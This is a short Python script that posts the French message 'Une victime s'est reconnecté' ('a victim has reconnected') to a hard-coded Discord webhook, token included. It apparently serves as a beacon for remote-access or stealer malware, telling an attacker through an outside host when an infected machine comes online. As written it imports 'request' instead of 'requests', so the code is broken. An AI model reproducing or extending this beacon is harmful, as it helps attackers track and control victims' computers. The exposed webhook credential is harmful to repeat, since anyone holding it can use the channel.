import request
discord = "https://discord.com/api/webhooks/878374540751798343/wL7H14mmDO_ShcwMWV5K2hzzb81bW6olmPuzD-PcUV2xY9LoNCz0cDinv76Mm-mwctpu"
Message = {
  "content": "Une victime s'est reconnecté."
}

request.post(discord, data=Message)
